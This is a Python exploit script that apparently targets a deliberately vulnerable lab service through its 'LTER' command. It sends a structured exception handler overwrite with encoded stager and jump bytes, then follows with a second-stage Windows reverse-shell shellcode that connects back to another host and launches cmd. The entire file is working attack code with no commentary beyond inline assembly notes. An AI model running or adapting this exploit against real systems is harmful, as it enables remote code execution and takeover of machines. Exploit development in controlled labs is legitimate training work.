import socket
import struct
import time 

def connect_to_server(host='172.19.131.67', port=9999):
    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server
        client_socket.connect((host, port))
        print(f"Successfully connected to {host} on port {port}")


        #long jump
        scbuf =b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x61\x22\x24\x21\x2d'
        scbuf+=b'\x62\x27\x28\x28\x2d\x3e\x25\x23\x26\x50\x25\x26\x2a\x4f\x3c\x25'
        scbuf+=b'\x41\x41\x30\x42\x2d\x69\x38\x6d\x64\x2d\x3e\x38\x7f\x38\x2d\x70'
        scbuf+=b'\x61\x21\x63\x50'

        #stager
        PAYLOAD =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x3c\x24\x7e\x7f\x2d'
        PAYLOAD += b'\x29\x7d\x7f\x76\x2d\x26\x7b\x71\x79\x50\x25\x26\x2a\x4f\x3c\x25'
        PAYLOAD += b'\x41\x41\x30\x42\x2d\x61\x7c\x7f\x7c\x2d\x7f\x38\x7f\x60\x2d\x21'
        PAYLOAD += b'\x7a\x7b\x62\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x39'
        PAYLOAD += b'\x50\x3c\x7f\x2d\x30\x7f\x60\x3b\x2d\x57\x6f\x7a\x3c\x50\x25\x26'
        PAYLOAD += b'\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x70\x77\x37\x28\x2d\x66\x7a'
        PAYLOAD += b'\x38\x3c\x2d\x72\x7d\x63\x76\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41'
        PAYLOAD += b'\x30\x42\x2d\x42\x2d\x34\x22\x2d\x2d\x31\x60\x24\x2d\x2d\x4e\x24'
        PAYLOAD += b'\x62\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x21\x7f\x7f'
        PAYLOAD += b'\x68\x2d\x2a\x61\x7d\x64\x2d\x2c\x3c\x7f\x6f\x50\x25\x26\x2a\x4f'
        PAYLOAD += b'\x3c\x25\x41\x41\x30\x42\x2d\x33\x3c\x63\x38\x2d\x2b\x7f\x2b\x37'
        PAYLOAD += b'\x2d\x22\x7d\x6c\x3d\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42'
        PAYLOAD += b'\x2d\x61\x2b\x3b\x28\x2d\x7f\x6f\x7c\x60\x2d\x21\x33\x6d\x23\x50'
        PAYLOAD += b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x7f\x60\x3d\x27\x2d'
        PAYLOAD += b'\x7f\x34\x50\x7f\x2d\x7f\x7e\x6f\x28\x50'

        #SHELLCODE
        SHELL =  b""
        SHELL += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
        SHELL += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
        SHELL += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
        SHELL += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
        SHELL += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        SHELL += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
        SHELL += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
        SHELL += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
        SHELL += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
        SHELL += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        SHELL += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        SHELL += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
        SHELL += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        SHELL += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
        SHELL += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
        SHELL += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xac\x13"
        SHELL += b"\x8c\x2c\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
        SHELL += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
        SHELL += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
        SHELL += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
        SHELL += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
        SHELL += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
        SHELL += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
        SHELL += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
        SHELL += b"\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68\xa6"
        SHELL += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
        SHELL += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

        # create STAGE1 with the shellcode and pad the rest of the 1024 buffer with NOPs
        STAGE1 = SHELL + b'\x90' * (1024 - len(SHELL))

        header = b'LTER .' 
        fuzz_data = b'A' * 16
        fuzz_data += b'\x54'                # PUSH ESP
        fuzz_data += b'\x58'                # POP EAX
        fuzz_data += b'\x66\x2d\x01\x0b'    # SUB AX,0x0b01
        fuzz_data += b'\x50'                # PUSH EAX
        fuzz_data += b'\x5c'                # POP ESP
        fuzz_data += PAYLOAD
        
        fuzz_data += b'A' * (3554 - 4 - 79 - 16 - 8 - len(PAYLOAD)) # 4 bytes for the NSEH overwrite (79 for our short jump, 16 padding, 8 stack alingment)

        #Align stack for long jump
        fuzz_data += b'\x54' # PUSH ESP
        fuzz_data += b'\x58' # POP EAX
        fuzz_data += b'\x2c\x30' # SUB AL, 0x30
        fuzz_data += b'\x50' # PUSH EAX
        fuzz_data += b'\x5c' # POP ESP
        fuzz_data += scbuf # LONG JUMP
        fuzz_data += b'A' * (79 - 6- len(scbuf)) # 6 bytes for the stack alignment bytes

        NSEH = b'\x75\x08' # NSEH overwrite to jump back 8 bytes if ZF is 1
        NSEH += b'\x74\x06' # NSEH overwrite to jump back 6 bytes if ZF is 0
        SEH = struct.pack('L',  0x6250172b) # POP POP RET for our SEH overwrite
        junk = b'C' * 2
        junk += b'\x54'                     # PUSH ESP
        junk += b'\x58'                     # POP EAX
        junk += b'\x66\x05\x73\x13'         # ADD AX, 0x1373
        junk += b'\x50'                     # PUSH EAX
        junk += b'\x5c'                     # POP ESP

        #making our short jump
        junk += b'\x25\x50\x50\x4A\x50'     # AND EAX, 0x504A5050
        junk += b'\x25\x2A\x2A\x30\x2A'     # AND EAX, 0x2A302A2A
        junk += b'\x05\x75\x40\x48\x48'     # ADD EAX, 0x48484075
        junk += b'\x05\x76\x40\x48\x48'     # ADD EAX, 0x48484076
        junk += b'\x50'                     # PUSH EAX

        junk += b'C' * (5000 - 3554 - 4)
        
        exploit = header + fuzz_data + NSEH + SEH + junk

        client_socket.sendall(exploit) 

        print(f"Sent message")  

        # Example of receiving a response (if any)
        response = client_socket.recv(1024)
        time.sleep(3)
        client_socket.sendall(STAGE1)
        print(f"Sent stage1")
        if response:
            print(f"Received response: {response.decode('utf-8')}")
        else:
            print("No response received from the server.")

    except socket.error as e:
        print(f"Socket error: {e}")
    
    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    connect_to_server()
